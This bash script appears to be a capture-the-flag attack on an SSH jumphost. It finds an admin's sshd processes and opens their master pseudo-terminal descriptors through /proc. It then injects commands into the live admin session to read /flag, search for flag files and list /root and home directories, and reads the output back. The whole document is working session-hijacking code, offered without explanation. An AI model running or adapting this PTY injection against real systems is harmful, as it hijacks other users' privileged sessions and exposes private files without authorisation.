#!/bin/bash
set -e

ssh-keygen -t ed25519 -f /tmp/mykey -N "" -q 2>/dev/null || true
PUBKEY=$(cat /tmp/mykey.pub)

# Get PIDs
ADMIN_SSHD=$(ps aux | grep 'sshd.*admin@pts' | grep -v grep | awk '{print $2}' | head -1)
PRIV_PID=$(ps aux | grep 'sshd: admin \[priv\]' | grep root | grep -v grep | awk '{print $2}' | head -1)
SSH_PID=$(ps aux | grep 'ssh -l admin tracker' | grep -v grep | awk '{print $2}' | head -1)
echo "admin_sshd=$ADMIN_SSHD priv=$PRIV_PID ssh=$SSH_PID"

# Find which ptmx fd corresponds to pts/1
echo "=== Identifying master PTY fd ==="
python3 - <<'PYEOF'
import fcntl, struct, os, sys

for pid in [int(p) for p in open('/proc/self/status').read().split() if False]:
    pass

import subprocess
ps = subprocess.check_output(['ps', 'aux']).decode()
pids = []
for line in ps.split('\n'):
    if 'sshd' in line and 'admin' in line:
        try:
            pids.append(int(line.split()[1]))
        except:
            pass

TIOCGPTN = 0x80045430

for pid in pids:
    try:
        fds = os.listdir(f'/proc/{pid}/fd')
    except:
        continue
    for fd_str in fds:
        fd_num = int(fd_str)
        path = f'/proc/{pid}/fd/{fd_str}'
        try:
            target = os.readlink(path)
        except:
            continue
        if 'ptmx' not in target:
            continue
        try:
            fd = os.open(path, os.O_RDWR | os.O_NOCTTY)
            ptn = struct.unpack('I', fcntl.ioctl(fd, TIOCGPTN, b'\x00'*4))[0]
            print(f'pid={pid} fd={fd_num} -> pts/{ptn}')
            os.close(fd)
        except Exception as e:
            print(f'pid={pid} fd={fd_num} -> error: {e}')
PYEOF

# Find jumphost internal IP
echo "=== Jumphost IPs ==="
hostname -I 2>/dev/null || cat /proc/net/fib_trie 2>/dev/null | grep -E "32 HOST" -B1 | grep "10\." | head

# Find the ptmx fd for pts/1 (usually fd 9 in sshd: admin@pts/1)
# Check which one corresponds to pts/1
PTMX_FD=9
echo "Using ptmx fd=$PTMX_FD in pid=$ADMIN_SSHD"

# Read output from master PTY in background (this captures tracker-prod's bash output)
echo "=== Reading from master PTY ==="
timeout 8 cat /proc/$ADMIN_SSHD/fd/$PTMX_FD > /tmp/pty_out.txt 2>&1 &
READ_PID=$!

sleep 0.3

# Inject a marker + flag read command
CMD=$(printf '\necho __START__; cat /flag 2>/dev/null; find / -maxdepth 4 -name "flag*" -exec cat {} \\; 2>/dev/null; ls /home/ /root/ /opt/ /srv/ 2>/dev/null; echo __END__\n')
printf "%s" "$CMD" > /proc/$ADMIN_SSHD/fd/$PTMX_FD

sleep 5
kill $READ_PID 2>/dev/null || true

echo "=== PTY output ==="
cat /tmp/pty_out.txt 2>/dev/null | strings | head -50

# Also try fd10
PTMX_FD2=10
echo "=== Trying fd10 ==="
timeout 4 cat /proc/$ADMIN_SSHD/fd/$PTMX_FD2 > /tmp/pty_out2.txt 2>&1 &
READ_PID2=$!
sleep 0.3
printf '%s' "$(printf '\necho __MARK__; cat /flag 2>/dev/null; echo __DONE__\n')" > /proc/$ADMIN_SSHD/fd/$PTMX_FD2
sleep 3
kill $READ_PID2 2>/dev/null || true
echo "=== PTY fd10 output ==="
cat /tmp/pty_out2.txt 2>/dev/null | strings | head -30
